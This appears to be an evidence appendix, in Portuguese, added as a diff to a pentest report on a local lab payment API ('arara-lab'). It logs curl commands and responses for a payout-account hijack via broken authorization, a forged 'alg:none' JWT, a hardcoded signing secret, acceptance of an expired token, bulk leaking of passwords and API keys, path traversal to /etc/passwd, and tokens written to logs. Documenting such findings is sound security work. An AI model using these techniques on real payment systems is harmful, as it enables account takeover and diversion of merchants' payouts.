@@ -1,0 +1,65 @@
+================================================================
+ APÊNDICE DE EVIDÊNCIAS — execução real contra http://localhost:3000
+ Lab: arara-lab (banco em memória, estado inicial a cada start)
+ Data da captura: 2026-10-07 18:29 UTC
+================================================================
+
+### [E0] LOGIN legítimo do atacante (m_4821) ###
+$ curl -s -X POST localhost:3000/v1/auth/login -d '{"email":"contato@alphatrader.com","senha":"senha2024"}'
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTEzOTc3OTF9.4Z1PaKLOtWUDvDTbg2AuSt9gq78h-yD8VrNgLOiff1I"}
+# payload do token (sem campo exp):
+{"sub":"m_4821","iat":1791397791}
+
+### [E1] BOLA — trocar payout de OUTRO lojista (vítima m_0093) ###
+# [antes] payout de m_0093:
+  237 0001 12345-6 11222333000181
+$ curl -s -i -X POST .../v1/merchants/payout-account -H 'Authorization: Bearer <TOKEN_m4821>' \
+    -d '{"merchant_id":"m_0093","banco":"999","agencia":"6666","conta":"00000-0","cpf_cnpj":"00000000000000","notify":false}'
+HTTP/1.1 201 Created
+# [depois] payout de m_0093 (persistido):
+  999 6666 00000-0 00000000000000
+
+### [E2] JWT alg:none — forja sem senha e sem segredo ###
+token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtXzAwOTMifQ.
+$ curl -s localhost:3000/v1/merchants/m_0093 -H 'Authorization: Bearer <alg:none>'
+{
+  "id": "m_0093",
+  "nome": "Curso Viver de Renda LTDA",
+  "email": "financeiro@viverderenda.com",
+  "senha": "arara123",
+  "api_key": "sk_live_m0093_8f2a1c",
+  "webhook_secret": "whsec_plataforma_unico",
+  "payout_banco": "999",
+  "payout_agencia": "6666",
+  "payout_conta": "00000-0",
+  "payout_cpf_cnpj": "00000000000000",
+  "saldo_centavos": 4820000
+}
+
+### [E3] Cadeia SEM credencial: alg:none + BOLA (vítima m_5117) ###
+HTTP 201
+# [depois] m_5117:
+  001 0001 13337-0
+
+### [E4] Segredo fixo 'arara-2024' — HS256 forjado aceito / segredo errado rejeitado ###
+token assinado com 'arara-2024'  -> HTTP 200
+token assinado com segredo errado -> HTTP 500
+
+### [E5] Token expirado (exp em 2023) aceito ###
+exp: {"sub":"m_5117","iat":1700000000,"exp":1700003600}
+resultado -> HTTP 200
+
+### [E6] IDOR / enumeração em massa (senha, api_key, webhook_secret de todos) ###
+  m_0093 | senha=arara123 | api_key=sk_live_m0093_8f2a1c | whsec=whsec_plataforma_unico
+  m_4821 | senha=senha2024 | api_key=sk_live_m4821_3b9e7d | whsec=whsec_plataforma_unico
+  m_5117 | senha=mudar123 | api_key=sk_live_m5117_c1d4f0 | whsec=whsec_plataforma_unico
+
+### [E7] Path traversal no relatório ###
+{
+  "merchant": "m_4821",
+  "download_url": "https://arara-conciliacao.s3.amazonaws.com/relatorios/../../../../etc/passwd",
+  "arquivo": "relatorios/../../../../etc/passwd"
+}
+
+### [E8] Token inteiro no log do servidor (nível DEBUG) ###
+[Nest] 786  - 10/07/2026, 6:29:51 PM   DEBUG [reports] conciliacao auth=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTEzOTc3OTF9.4Z1PaKLOtWUDvDTbg2AuSt9gq78h-yD8VrNgLOiff1I params={"arquivo":"out.csv"}
